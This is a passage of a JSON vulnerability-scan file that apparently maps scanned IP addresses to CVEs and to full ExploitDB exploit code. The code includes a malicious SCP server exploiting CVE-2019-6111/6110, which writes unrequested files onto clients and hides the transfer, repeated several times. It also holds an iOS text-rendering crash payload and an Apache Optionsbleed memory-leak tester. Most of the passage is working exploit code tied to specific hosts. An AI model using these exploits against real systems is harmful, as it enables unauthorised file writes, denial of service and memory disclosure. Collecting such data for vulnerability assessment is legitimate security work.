b'dIyWSE9DHbnVVP4hnF2B79CqV8nTxoWmlomuzjl664HiLbZSdrtEOdIYVqBaTeKdWNccJS'\r\n    b'J+NlZGQJZ7isJK0gs27N63dPn+oefjYU/DMGy2p7en4+7w+nJ8OG0eD/vwC6VpDqYpCwAA'\r\n))\r\n\r\nclass ScpServer(paramiko.ServerInterface):\r\n    def __init__(self):\r\n        self.event = threading.Event()\r\n\r\n    def check_auth_password(self, username, password):\r\n        logging.info('Authenticated with %s:%s', username, password)\r\n        return paramiko.AUTH_SUCCESSFUL\r\n\r\n    def check_channel_request(self, kind, chanid):\r\n        logging.info('Opened session channel %d', chanid)\r\n        if kind == \"session\":\r\n            return paramiko.OPEN_SUCCEEDED\r\n        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED\r\n\r\n    def check_channel_exec_request(self, channel, command):\r\n        command = command.decode('ascii')\r\n        logging.info('Approving exec request: %s', command)\r\n        parts = command.split(' ')\r\n        # Make sure that this is a request to get a file:\r\n        assert parts[0] == 'scp'\r\n        assert '-f' in parts\r\n        file = parts[-1]\r\n        # Send file from a new thread.\r\n        threading.Thread(target=self.send_file, args=(channel, file)).start()\r\n        return True\r\n\r\n    def send_file(self, channel, file):\r\n        '''\r\n        The meat of the exploit:\r\n            1. Send the requested file.\r\n            2. Send another file (exploit.txt) that was not requested.\r\n            3. Print ANSI escape sequences to stderr to hide the transfer of\r\n               exploit.txt.\r\n        '''\r\n        def wait_ok():\r\n            assert channel.recv(1024) == b'\\x00'\r\n        def send_ok():\r\n            channel.sendall(b'\\x00')\r\n\r\n        wait_ok()\r\n\r\n        logging.info('Sending requested file \"%s\" to channel %d', file,\r\n            channel.get_id())\r\n        command = 'C0664 {} {}\\n'.format(len(dummy), file).encode('ascii')\r\n        channel.sendall(command)\r\n        wait_ok()\r\n        channel.sendall(dummy)\r\n        send_ok()\r\n        wait_ok()\r\n\r\n        # This is CVE-2019-6111: whatever file the client requested, we send\r\n        # them 'exploit.txt' instead.\r\n        logging.info('Sending malicious file \"exploit.txt\" to channel %d',\r\n            channel.get_id())\r\n        command = 'C0664 {} exploit.txt\\n'.format(len(payload)).encode('ascii')\r\n        channel.sendall(command)\r\n        wait_ok()\r\n        channel.sendall(payload)\r\n        send_ok()\r\n        wait_ok()\r\n\r\n        # This is CVE-2019-6110: the client will display the text that we send\r\n        # to stderr, even if it contains ANSI escape sequences. We can send\r\n        # ANSI codes that clear the current line to hide the fact that a second\r\n        # file was transmitted..\r\n        logging.info('Covering our tracks by sending ANSI escape sequence')\r\n        channel.sendall_stderr(\"\\x1b[1A\".encode('ascii'))\r\n        channel.close()\r\n\r\ndef main():\r\n    logging.info('Creating a temporary RSA host key...')\r\n    host_key = paramiko.rsakey.RSAKey.generate(1024)\r\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\r\n    sock.bind(('localhost', 2222))\r\n    sock.listen(0)\r\n    logging.info('Listening on port 2222...')\r\n\r\n    while True:\r\n        client, addr = sock.accept()\r\n        logging.info('Received connection from %s:%s', *addr)\r\n        transport = paramiko.Transport(client)\r\n        transport.add_server_key(host_key)\r\n        server = ScpServer()\r\n        transport.start_server(server=server)\r\n\r\nif __name__ == '__main__':\r\n    main()",
                "description": "OpenSSH SCP Client - Write Arbitrary Files",
                "author": "Harry Sintonen",
                "_id": 46516,
                "source": "ExploitDB",
                "platform": "multiple",
                "date": "2019-01-11T00:00:00+00:00",
                "cve": [
                    "CVE-2019-6111",
                    "CVE-2019-6110"
                ],
                "type": "remote",
                "port": 0
            }
        ]
    },
    "152.14.75.128": {
        "CVE-2016-3142": [
            {
                "source": "CVE",
                "_id": "2016-3142",
                "description": "The phar_parse_zipfile function in zip.c in the PHAR extension in PHP before 5.5.33 and 5.6.x before 5.6.19 allows remote attackers to obtain sensitive information from process memory or cause a denial of service (out-of-bounds read and application crash) by placing a PK\\x05\\x06 signature at an invalid location.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2016-3142"
                ],
                "msb": []
            }
        ]
    },
    "152.14.87.24": {
        "CVE-2017-7679": [
            {
                "source": "CVE",
                "_id": "2017-7679",
                "description": "In Apache httpd 2.2.x before 2.2.33 and 2.4.x before 2.4.26, mod_mime can read one byte past the end of a buffer when sending a malicious Content-Type response header.",
                "osvdb": [],
                "bid": [
                    99170
                ],
                "cve": [
                    "CVE-2017-7679"
                ],
                "msb": []
            },
            {
                "code": "# Exploit Title: TpwnT - iOS Denail of Service POC\r\n# Date: 10-31-2017\r\n# Exploit Author: Russian Otter (Ro)\r\n# Vendor Homepage: https://support.apple.com/en-us/HT208222\r\n# Version: 2.1\r\n# Tested on: iOS 10.3.2 - 11.1\r\n# CVE: CVE-2017-13849\r\n\r\n\"\"\"\r\n-------------------------\r\n     CVE-2017-13849\r\n  TpwnT by Ro of SavSec\r\n-------------------------\r\n\r\nDescription:\r\n\tThread Pwning Text (TpwnT) is maliciously crafted text that affects the iPhone and other Apple devices by exploiting a vulnerability found in the Core-Text firmware which results in a thread crash or extreme application lag!\r\n\r\nRecorded Tests / Results:\r\n\tSignal version 2.14.1 on iOS 10.3.2 (fixed on 2.15.3) users were able to crash conversations by sending the payload which would result in the app crashing when the selected chat was opened.\r\n\t\r\n\tInstagram version 10.25 (fixed on 10.31) on iOS 10.3.2 and resulting in chat thread crashes when the payload was sent which disallowed users to load chat or send messages. When the payload was unsent the chat was fuctional.\r\n\t\r\n\tPythonista 3 on iOS 10.3.2, crashed when displaying multiple sets of TpwnT or while rotating the device.\r\n\t\r\nSummary:\r\n\tWhen displaying the TpwnT Characters on iOS < 11.1 the iPhone may lag intensely or crash on certain apps!\r\n\tThis allows for the possibility of DoS related attacks or application crashing attacks.\r\n\r\nCreator: @Russian_Otter (Ro)\r\nDiscovery: 7-17-2017\r\nDisclosure: 10-31-2017\r\nDisclosure Page: https://support.apple.com/en-us/HT208222\r\n\r\nAffected Devices\r\n\tiPhone 5S iOS < 11.1\r\n\tiPhone 6 & 6S iOS < 11.1\r\n\tiPhone 7 iOS < 11.1\r\n\tiPhone 8 iOS < 11.1\r\n\tiPhone X iOS < 11.1\r\n\tApple TV 4th Generation\r\n\tApple TV 4K 4th Generation\r\n\tiPod Touch 6th Generation\r\n\tiPad Air\r\n\twatchOS < 4.1\r\n\ttvOS < 11.1\r\n\tiOS < 11.1\r\n\r\nTested Devices:\r\n\tiPhone 5S iOS 10.3.2 - 11.1\r\n\tiPhone 6S iOS 10.3.1 - 11.1\r\n\tiPad Mini 2 iOS 10.3.2\r\n\tApple TV 2 tvOS 10\r\n\r\nTested Apps:\r\n\tSignal\r\n\tInstagram\r\n\tSnapchat\r\n\tSafari\r\n\tTanktastic\r\n\tPythonista 3\r\n\tNotepad\r\n\r\n\"\"\"\r\n\r\ntpwnt = \"880 881 883 887 888 975 1159 1275 1276 1277 1278 1302 1304 1305 1306 1311 1313 1314 1316 1317 1318 1319 1322 1323 1324 1325 1326 1327 1328 1543 2304 2405 3073 3559 3585 3586 4091 4183 4184 4353 6366 6798 7679 7680 7837 7930 7932 7933 7934 7935 7936 8343 8344 8345 8346 8347 8348 8349 8376 8381 8382 8383 8384 8524 9136 9169 10215 10216 11153 11374 11377 11381 11390 11392 11746 11747 11748 11749 11750 11751 11752 11753 11754 11755 11756 11757 11758 11759 11760 11761 11762 11763 11764 11765 11766 11767 11768 11769 11771 11772 11773 11774 11775 11776 11811 11813 11814 12295 12344 12357 12686 19971 19975 42560 42562 42563 42564 42565 42566 42567 42568 42569 42570 42571 42572 42573 42574 42575 42576 42577 42578 42579 42580 42581 42583 42584 42585 42587 42588 42589 42590 42591 42592 42594 42595 42596 42597 42598 42599 42600 42601 42602 42603 42604 42605 42606 42608 42609 42610 42611 42612 42613 42614 42615 42616 42617 42619 42620 42621 42622 42623 42624 42625 42627 42628 42629 42630 42632 42633 42634\".split()\r\n\r\npayload = \"\"\r\nfor i in tpwnt:\r\n\ts = unichr(int(i))\r\n\tpayload += s\r\n\r\npayload = bytes(payload)\r\npayload_unicode = unicode(payload)\r\n\r\n# Proof of Concept\r\n# iOS < 11.1 Devices that display these characters should experience lag or crashes while TpwnT is visible\r\n\r\nif raw_input(\"Show Payload [y/n] \") == \"y\":\r\n\tprint payload_unicode",
                "description": "iOS < 11.1 / tvOS < 11.1 / watchOS < 4.1 - Denial of Service",
                "author": "Russian Otter",
                "_id": 43161,
                "source": "ExploitDB",
                "platform": "ios",
                "date": "2017-11-20T00:00:00+00:00",
                "cve": [
                    "CVE-2017-13849"
                ],
                "type": "dos",
                "port": 0
            }
        ],
        "CVE-2017-9798": [
            {
                "source": "CVE",
                "_id": "2017-9798",
                "description": "Apache httpd allows remote attackers to read secret data from process memory if the Limit directive can be set in a user's .htaccess file, or if httpd.conf has certain misconfigurations, aka Optionsbleed. This affects the Apache HTTP Server through 2.2.34 and 2.4.x through 2.4.27. The attacker sends an unauthenticated OPTIONS HTTP request when attempting to read secret data. This is a use-after-free issue and thus secret data is not always sent, and the specific data depends on many factors including configuration. Exploitation with .htaccess can be blocked with a patch to the ap_limit_section function in server/core.c.",
                "osvdb": [],
                "bid": [
                    100872,
                    105598
                ],
                "cve": [
                    "CVE-2017-9798"
                ],
                "msb": []
            },
            {
                "code": "#!/usr/bin/env python3\r\n\r\n# Optionsbleed proof of concept test\r\n# by Hanno B\u00f6ck\r\n\r\nimport argparse\r\nimport urllib3\r\nimport re\r\n\r\n\r\ndef test_bleed(url, args):\r\n    r = pool.request('OPTIONS', url)\r\n    try:\r\n        allow = str(r.headers[\"Allow\"])\r\n    except KeyError:\r\n        return False\r\n    if allow in dup:\r\n        return\r\n    dup.append(allow)\r\n    if allow == \"\":\r\n        print(\"[empty] %s\" % (url))\r\n    elif re.match(\"^[a-zA-Z]+(-[a-zA-Z]+)? *(, *[a-zA-Z]+(-[a-zA-Z]+)? *)*$\", allow):\r\n        z = [x.strip() for x in allow.split(',')]\r\n        if len(z) > len(set(z)):\r\n            print(\"[duplicates] %s: %s\" % (url, repr(allow)))\r\n        elif args.all:\r\n            print(\"[ok] %s: %s\" % (url, repr(allow)))\r\n    elif re.match(\"^[a-zA-Z]+(-[a-zA-Z]+)? *( +[a-zA-Z]+(-[a-zA-Z]+)? *)+$\", allow):\r\n        print(\"[spaces] %s: %s\" % (url, repr(allow)))\r\n    else:\r\n        print(\"[bleed] %s: %s\" % (url, repr(allow)))\r\n    return True\r\n\r\n\r\nparser = argparse.ArgumentParser(\r\n         description='Check for the Optionsbleed vulnerability (CVE-2017-9798).',\r\n         epilog=\"Tests server for Optionsbleed bug and other bugs in the allow header.\\n\\n\"\r\n         \"Autmatically checks http://, https://, http://www. and https://www. -\\n\"\r\n         \"except if you pass -u/--url (which means by default we check 40 times.)\\n\\n\"\r\n         \"Explanation of results:\\n\"\r\n         \"[bleed] corrupted header found, vulnerable\\n\"\r\n         \"[empty] empty allow header, does not make sense\\n\"\r\n         \"[spaces] space-separated method list (should be comma-separated)\\n\"\r\n         \"[duplicates] duplicates in list (may be apache bug 61207)\\n\"\r\n         \"[ok] normal list found (only shown with -a/--all)\\n\",\r\n         formatter_class=argparse.RawTextHelpFormatter)\r\nparser.add_argument('hosttocheck',  action='store',\r\n                    help='The hostname you want to test against')\r\nparser.add_argument('-n', nargs=1, type=int, default=[10],\r\n                    help='number of tests (default 10)')\r\nparser.add_argument(\"-a\", \"--all\", action=\"store_true\",\r\n                    help=\"show headers from hosts without problems\")\r\nparser.add_argument(\"-u\", \"--url\", action='store_true',\r\n                    help=\"pass URL instead of hostname\")\r\nargs = parser.parse_args()\r\nhowoften = int(args.n[0])\r\n\r\ndup = []\r\n\r\n# Note: This disables warnings about the lack of certificate verification.\r\n# Usually this is a bad idea, but for this tool we want to find vulnerabilities\r\n# even if they are shipped with invalid certificates.\r\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\r\n\r\npool = urllib3.PoolManager(10, cert_reqs='CERT_NONE')\r\n\r\nif args.url:\r\n    test_bleed(args.hosttocheck, args)\r\nelse:\r\n    for prefix in ['http://', 'http://www.', 'https://', 'https://www.']:\r\n        for i in range(howoften):\r\n            try:\r\n                if test_bleed(prefix+args.hosttocheck, args) is False:\r\n                    break\r\n            except Exception as e:\r\n                pass",
                "description": "Apache < 2.2.34 / < 2.4.27 - OPTIONS Memory Leak",
                "author": "Hanno Bock",
                "_id": 42745,
                "source": "ExploitDB",
                "platform": "linux",
                "date": "2017-09-18T00:00:00+00:00",
                "cve": [
                    "CVE-2017-9798"
                ],
                "type": "webapps",
                "port": 0
            }
        ],
        "CVE-2016-1546": [
            {
                "source": "CVE",
                "_id": "2016-1546",
                "description": "The Apache HTTP Server 2.4.17 and 2.4.18, when mod_http2 is enabled, does not limit the number of simultaneous stream workers for a single HTTP/2 connection, which allows remote attackers to cause a denial of service (stream-processing outage) via modified flow-control windows.",
                "osvdb": [],
                "bid": [
                    92331
                ],
                "cve": [
                    "CVE-2016-1546"
                ],
                "msb": []
            }
        ],
        "CVE-2018-1312": [
            {
                "source": "CVE",
                "_id": "2018-1312",
                "description": "In Apache httpd 2.2.0 to 2.4.29, when generating an HTTP Digest authentication challenge, the nonce sent to prevent reply attacks was not correctly generated using a pseudo-random seed. In a cluster of servers using a common Digest authentication configuration, HTTP requests could be replayed across servers by an attacker without detection.",
                "osvdb": [],
                "bid": [
                    103524
                ],
                "cve": [
                    "CVE-2018-1312"
                ],
                "msb": []
            }
        ],
        "CVE-2018-1333": [
            {
                "source": "CVE",
                "_id": "2018-1333",
                "description": "By specially crafting HTTP/2 requests, workers would be allocated 60 seconds longer than necessary, leading to worker exhaustion and a denial of service. Fixed in Apache HTTP Server 2.4.34 (Affected 2.4.18-2.4.30,2.4.33).",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2018-1333"
                ],
                "msb": []
            }
        ],
        "CVE-2018-11763": [
            {
                "source": "CVE",
                "_id": "2018-11763",
                "description": "In Apache HTTP Server 2.4.17 to 2.4.34, by sending continuous, large SETTINGS frames a client can occupy a connection, server thread and CPU time without any connection timeout coming to effect. This affects only HTTP/2 connections. A possible mitigation is to not enable the h2 protocol.",
                "osvdb": [],
                "bid": [
                    105414
                ],
                "cve": [
                    "CVE-2018-11763"
                ],
                "msb": []
            }
        ],
        "CVE-2016-8612": [
            {
                "source": "CVE",
                "_id": "2016-8612",
                "description": "Apache HTTP Server mod_cluster before version httpd 2.4.23 is vulnerable to an Improper Input Validation in the protocol parsing logic in the load balancer resulting in a Segmentation Fault in the serving httpd process.",
                "osvdb": [],
                "bid": [
                    94939
                ],
                "cve": [
                    "CVE-2016-8612"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-8612",
                "description": "A Denial Of Service vulnerability exists when Connected User Experiences and Telemetry Service fails to validate certain function values, aka \"Connected User Experiences and Telemetry Service Denial of Service Vulnerability.\" This affects Windows Server 2016, Windows 10, Windows Server 2019, Windows 10 Servers.",
                "osvdb": [],
                "bid": [
                    106087
                ],
                "cve": [
                    "CVE-2018-8612"
                ],
                "msb": []
            }
        ],
        "CVE-2019-0197": [
            {
                "source": "CVE",
                "_id": "2019-0197",
                "description": "A vulnerability was found in Apache HTTP Server 2.4.34 to 2.4.38. When HTTP/2 was enabled for a http: host or H2Upgrade was enabled for h2 on a https: host, an Upgrade request from http/1.1 to http/2 that was not the first request on a connection could lead to a misconfiguration and crash. Server that never enabled the h2 protocol or that only enabled it for https: and did not set \"H2Upgrade on\" are unaffected by this issue.",
                "osvdb": [],
                "bid": [
                    107665
                ],
                "cve": [
                    "CVE-2019-0197"
                ],
                "msb": []
            }
        ]
    },
    "152.14.88.64": {
        "CVE-2019-6111": [
            {
                "source": "CVE",
                "_id": "2019-7283",
                "description": "An issue was discovered in rcp in NetKit through 0.17. For an rcp operation, the server chooses which files/directories are sent to the client. However, the rcp client only performs cursory validation of the object name returned. A malicious rsh server (or Man-in-The-Middle attacker) can overwrite arbitrary files in a directory on the rcp client machine. This is similar to CVE-2019-6111.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2019-7283"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2019-6111",
                "description": "An issue was discovered in OpenSSH 7.9. Due to the scp implementation being derived from 1983 rcp, the server chooses which files/directories are sent to the client. However, the scp client only performs cursory validation of the object name returned (only directory traversal attacks are prevented). A malicious scp server (or Man-in-The-Middle attacker) can overwrite arbitrary files in the scp client target directory. If recursive operation (-r) is performed, the server can manipulate subdirectories as well (for example, to overwrite the .ssh/authorized_keys file).",
                "osvdb": [],
                "bid": [
                    106741
                ],
                "cve": [
                    "CVE-2019-6111"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2019-25017",
                "description": "An issue was discovered in rcp in MIT krb5-appl through 1.0.3. Due to the rcp implementation being derived from 1983 rcp, the server chooses which files/directories are sent to the client. However, the rcp client only performs cursory validation of the object name returned (only directory traversal attacks are prevented). A malicious rcp server (or Man-in-The-Middle attacker) can overwrite arbitrary files in the rcp client target directory. If recursive operation (-r) is performed, the server can manipulate subdirectories as well (for example, to overwrite the .ssh/authorized_keys file). This issue is similar to CVE-2019-6111 and CVE-2019-7283. NOTE: MIT krb5-appl is not supported upstream but is shipped by a few Linux distributions. The affected code was removed from the supported MIT Kerberos 5 (aka krb5) product many years ago, at version 1.8.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2019-25017"
                ],
                "msb": []
            },
            {
                "code": "# Exploit Title: SSHtranger Things\r\n# Date: 2019-01-17\r\n# Exploit Author: Mark E. Haase <mhaase@hyperiongray.com>\r\n# Vendor Homepage: https://www.openssh.com/\r\n# Software Link: [download link if available]\r\n# Version: OpenSSH 7.6p1\r\n# Tested on: Ubuntu 18.04.1 LTS\r\n# CVE : CVE-2019-6111, CVE-2019-6110\r\n\r\n'''\r\nTitle:     SSHtranger Things\r\nAuthor:    Mark E. Haase <mhaase@hyperiongray.com>\r\nHomepage:  https://www.hyperiongray.com\r\nDate:      2019-01-17\r\nCVE:       CVE-2019-6111, CVE-2019-6110\r\nAdvisory:  https://sintonen.fi/advisories/scp-client-multiple-vulnerabilities.txt\r\nTested on: Ubuntu 18.04.1 LTS, OpenSSH client 7.6p1\r\n\r\nWe have nicknamed this \"SSHtranger Things\" because the bug is so old it could be\r\nexploited by an 8-bit Demogorgon. Tested on Python 3.6.7 and requires `paramiko`\r\npackage.\r\n\r\nThe server listens on port 2222. It accepts any username and password, and it\r\ngenerates a new host key every time you run it.\r\n\r\n    $ python3 sshtranger_things.py\r\n\r\nDownload a file using a vulnerable client. The local path must be a dot:\r\n\r\n    $ scp -P 2222 foo@localhost:test.txt .\r\n    The authenticity of host '[localhost]:2222 ([127.0.0.1]:2222)' can't be established.\r\n    RSA key fingerprint is SHA256:C7FhMqqiMpkqG9j+11S2Wv9lQYlN1jkDiipdeFMZT1w.\r\n    Are you sure you want to continue connecting (yes/no)? yes\r\n    Warning: Permanently added '[localhost]:2222' (RSA) to the list of known hosts.\r\n    foo@localhost's password:\r\n    test.txt                                       100%   32     0.7KB/s   00:00\r\n\r\nThe file you requested (e.g. test.txt) will be saved in your current directory.\r\nIf your client is vulnerable, you will have an additional file \"exploit.txt\"\r\ncreated in your current directory.\r\n\r\n    $ cat test.txt\r\n    This is the file you requested.\r\n    $ cat exploit.txt\r\n    SSHtranger Things\r\n\r\nThe interesting code is in ScpServer.send_file().\r\n'''\r\nimport base64\r\nimport gzip\r\nimport logging\r\nimport paramiko\r\nimport paramiko.rsakey\r\nimport socket\r\nimport threading\r\n\r\nlogging.basicConfig(level=logging.INFO)\r\n\r\ndummy = 'This is the file you requested.\\n'\r\npayload = gzip.decompress(base64.b64decode(\r\n    b'H4sIAAa+QFwC/51VQW4CMQy85xV+AX+qqrZwoFSo0orbHvbQQw9NIiH1Af0YLyndjZ2x46'\r\n    b'ygaIGs43jGTjIORJfzh3nIN/IwltH1b+LHeGdxHnXUsoCWD6yYyjt7AfA1XJdLDR8u5yRA'\r\n    b'1/lEjiHbHGafXOMVpySuZaH4Jk1lgjxoocN5YMhRoNhhpA5EWMhlRHBNCWogZYhOnmk2V7'\r\n    b'C4FJgwHxKSEwEzTskrQITtj1gYIurAhWUfsDbWIFyXlRwDc8okeZkCzNyjlMmcT4wxA39d'\r\n    b'zp8OsJDJsGV/wV3I0JwJLNXKlOxJAs5Z7WwqmUZMPZmzqupttkhPRd4ovE8jE0gNyQ5skM'\r\n    b'uVy4jk4BljnYwCQ2CUs53KtnKEYkucQJIEyoGud5wYXQUuXvimAYJMJyLlqkyQHlsK6XLz'\r\n    b'I6Q6m4WKYmOzjRxEhtXWBA1qrvmBVRgGGIoT1dIRKSN+yeaJQQKuNEEadONJjkcdI2iFC4'\r\n    b'Hs55bGI12K2rn1fuN1P4/DWtuwHQYdb+0Vunt5DDpS3+0MLaN7FF73II+PK9OungPEnZrc'\r\n    b'dIyWSE9DHbnVVP4hnF2B79CqV8nTxoWmlomuzjl664HiLbZSdrtEOdIYVqBaTeKdWNccJS'\r\n    b'J+NlZGQJZ7isJK0gs27N63dPn+oefjYU/DMGy2p7en4+7w+nJ8OG0eD/vwC6VpDqYpCwAA'\r\n))\r\n\r\nclass ScpServer(paramiko.ServerInterface):\r\n    def __init__(self):\r\n        self.event = threading.Event()\r\n\r\n    def check_auth_password(self, username, password):\r\n        logging.info('Authenticated with %s:%s', username, password)\r\n        return paramiko.AUTH_SUCCESSFUL\r\n\r\n    def check_channel_request(self, kind, chanid):\r\n        logging.info('Opened session channel %d', chanid)\r\n        if kind == \"session\":\r\n            return paramiko.OPEN_SUCCEEDED\r\n        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED\r\n\r\n    def check_channel_exec_request(self, channel, command):\r\n        command = command.decode('ascii')\r\n        logging.info('Approving exec request: %s', command)\r\n        parts = command.split(' ')\r\n        # Make sure that this is a request to get a file:\r\n        assert parts[0] == 'scp'\r\n        assert '-f' in parts\r\n        file = parts[-1]\r\n        # Send file from a new thread.\r\n        threading.Thread(target=self.send_file, args=(channel, file)).start()\r\n        return True\r\n\r\n    def send_file(self, channel, file):\r\n        '''\r\n        The meat of the exploit:\r\n            1. Send the requested file.\r\n            2. Send another file (exploit.txt) that was not requested.\r\n            3. Print ANSI escape sequences to stderr to hide the transfer of\r\n               exploit.txt.\r\n        '''\r\n        def wait_ok():\r\n            assert channel.recv(1024) == b'\\x00'\r\n        def send_ok():\r\n            channel.sendall(b'\\x00')\r\n\r\n        wait_ok()\r\n\r\n        logging.info('Sending requested file \"%s\" to channel %d', file,\r\n            channel.get_id())\r\n        command = 'C0664 {} {}\\n'.format(len(dummy), file).encode('ascii')\r\n        channel.sendall(command)\r\n        wait_ok()\r\n        channel.sendall(dummy)\r\n        send_ok()\r\n        wait_ok()\r\n\r\n        # This is CVE-2019-6111: whatever file the client requested, we send\r\n        # them 'exploit.txt' instead.\r\n        logging.info('Sending malicious file \"exploit.txt\" to channel %d',\r\n            channel.get_id())\r\n        command = 'C0664 {} exploit.txt\\n'.format(len(payload)).encode('ascii')\r\n        channel.sendall(command)\r\n        wait_ok()\r\n        channel.sendall(payload)\r\n        send_ok()\r\n        wait_ok()\r\n\r\n        # This is CVE-2019-6110: the client will display the text that we send\r\n        # to stderr, even if it contains ANSI escape sequences. We can send\r\n        # ANSI codes that clear the current line to hide the fact that a second\r\n        # file was transmitted..\r\n        logging.info('Covering our tracks by sending ANSI escape sequence')\r\n        channel.sendall_stderr(\"\\x1b[1A\".encode('ascii'))\r\n        channel.close()\r\n\r\ndef main():\r\n    logging.info('Creating a temporary RSA host key...')\r\n    host_key = paramiko.rsakey.RSAKey.generate(1024)\r\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\r\n    sock.bind(('localhost', 2222))\r\n    sock.listen(0)\r\n    logging.info('Listening on port 2222...')\r\n\r\n    while True:\r\n        client, addr = sock.accept()\r\n        logging.info('Received connection from %s:%s', *addr)\r\n        transport = paramiko.Transport(client)\r\n        transport.add_server_key(host_key)\r\n        server = ScpServer()\r\n        transport.start_server(server=server)\r\n\r\nif __name__ == '__main__':\r\n    main()",
                "description": "SCP Client - Multiple Vulnerabilities (SSHtranger Things)",
                "author": "Mark E. Haase",
                "_id": 46193,
                "source": "ExploitDB",
                "platform": "multiple",
                "date": "2019-01-18T00:00:00+00:00",
                "cve": [
                    "CVE-2019-6111",
                    "CVE-2019-6110"
                ],
                "type": "remote",
                "port": 0
            },
            {
                "code": "'''\r\nTitle:     SSHtranger Things\r\nAuthor:    Mark E. Haase <mhaase@hyperiongray.com>\r\nHomepage:  https://www.hyperiongray.com\r\nDate:      2019-01-17\r\nCVE:       CVE-2019-6111, CVE-2019-6110\r\nAdvisory:  https://sintonen.fi/advisories/scp-client-multiple-vulnerabilities.txt\r\nTested on: Ubuntu 18.04.1 LTS, OpenSSH client 7.6p1\r\n\r\nWe have nicknamed this \"SSHtranger Things\" because the bug is so old it could be\r\nexploited by an 8-bit Demogorgon. Tested on Python 3.6.7 and requires `paramiko`\r\npackage.\r\n\r\nThe server listens on port 2222. It accepts any username and password, and it\r\ngenerates a new host key every time you run it.\r\n\r\n    $ python3 sshtranger_things.py\r\n\r\nDownload a file using a vulnerable client. The local path must be a dot:\r\n\r\n    $ scp -P 2222 foo@localhost:test.txt .\r\n    The authenticity of host '[localhost]:2222 ([127.0.0.1]:2222)' can't be established.\r\n    RSA key fingerprint is SHA256:C7FhMqqiMpkqG9j+11S2Wv9lQYlN1jkDiipdeFMZT1w.\r\n    Are you sure you want to continue connecting (yes/no)? yes\r\n    Warning: Permanently added '[localhost]:2222' (RSA) to the list of known hosts.\r\n    foo@localhost's password:\r\n    test.txt                                       100%   32     0.7KB/s   00:00\r\n\r\nThe file you requested (e.g. test.txt) will be saved in your current directory.\r\nIf your client is vulnerable, you will have an additional file \"exploit.txt\"\r\ncreated in your current directory.\r\n\r\n    $ cat test.txt\r\n    This is the file you requested.\r\n    $ cat exploit.txt\r\n    SSHtranger Things\r\n\r\nThe interesting code is in ScpServer.send_file().\r\n'''\r\nimport base64\r\nimport gzip\r\nimport logging\r\nimport paramiko\r\nimport paramiko.rsakey\r\nimport socket\r\nimport threading\r\n\r\nlogging.basicConfig(level=logging.INFO)\r\n\r\ndummy = 'This is the file you requested.\\n'\r\npayload = gzip.decompress(base64.b64decode(\r\n    b'H4sIAAa+QFwC/51VQW4CMQy85xV+AX+qqrZwoFSo0orbHvbQQw9NIiH1Af0YLyndjZ2x46'\r\n    b'ygaIGs43jGTjIORJfzh3nIN/IwltH1b+LHeGdxHnXUsoCWD6yYyjt7AfA1XJdLDR8u5yRA'\r\n    b'1/lEjiHbHGafXOMVpySuZaH4Jk1lgjxoocN5YMhRoNhhpA5EWMhlRHBNCWogZYhOnmk2V7'\r\n    b'C4FJgwHxKSEwEzTskrQITtj1gYIurAhWUfsDbWIFyXlRwDc8okeZkCzNyjlMmcT4wxA39d'\r\n    b'zp8OsJDJsGV/wV3I0JwJLNXKlOxJAs5Z7WwqmUZMPZmzqupttkhPRd4ovE8jE0gNyQ5skM'\r\n    b'uVy4jk4BljnYwCQ2CUs53KtnKEYkucQJIEyoGud5wYXQUuXvimAYJMJyLlqkyQHlsK6XLz'\r\n    b'I6Q6m4WKYmOzjRxEhtXWBA1qrvmBVRgGGIoT1dIRKSN+yeaJQQKuNEEadONJjkcdI2iFC4'\r\n    b'Hs55bGI12K2rn1fuN1P4/DWtuwHQYdb+0Vunt5DDpS3+0MLaN7FF73II+PK9OungPEnZrc'\r\n    b'dIyWSE9DHbnVVP4hnF2B79CqV8nTxoWmlomuzjl664HiLbZSdrtEOdIYVqBaTeKdWNccJS'\r\n    b'J+NlZGQJZ7isJK0gs27N63dPn+oefjYU/DMGy2p7en4+7w+nJ8OG0eD/vwC6VpDqYpCwAA'\r\n))\r\n\r\nclass ScpServer(paramiko.ServerInterface):\r\n    def __init__(self):\r\n        self.event = threading.Event()\r\n\r\n    def check_auth_password(self, username, password):\r\n        logging.info('Authenticated with %s:%s', username, password)\r\n        return paramiko.AUTH_SUCCESSFUL\r\n\r\n    def check_channel_request(self, kind, chanid):\r\n        logging.info('Opened session channel %d', chanid)\r\n        if kind == \"session\":\r\n            return paramiko.OPEN_SUCCEEDED\r\n        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED\r\n\r\n    def check_channel_exec_request(self, channel, command):\r\n        command = command.decode('ascii')\r\n        logging.info('Approving exec request: %s', command)\r\n        parts = command.split(' ')\r\n        # Make sure that this is a request to get a file:\r\n        assert parts[0] == 'scp'\r\n        assert '-f' in parts\r\n        file = parts[-1]\r\n        # Send file from a new thread.\r\n        threading.Thread(target=self.send_file, args=(channel, file)).start()\r\n        return True\r\n\r\n    def send_file(self, channel, file):\r\n        '''\r\n        The meat of the exploit:\r\n            1. Send the requested file.\r\n            2. Send another file (exploit.txt) that was not requested.\r\n            3. Print ANSI escape sequences to stderr to hide the transfer of\r\n               exploit.txt.\r\n        '''\r\n        def wait_ok():\r\n            assert channel.recv(1024) == b'\\x00'\r\n        def send_ok():\r\n            channel.sendall(b'\\x00')\r\n\r\n        wait_ok()\r\n\r\n        logging.info('Sending requested file \"%s\" to channel %d', file,\r\n            channel.get_id())\r\n        command = 'C0664 {} {}\\n'.format(len(dummy), file).encode('ascii')\r\n        channel.sendall(command)\r\n        wait_ok()\r\n        channel.sendall(dummy)\r\n        send_ok()\r\n        wait_ok()\r\n\r\n        # This is CVE-2019-6111: whatever file the client requested, we send\r\n        # them 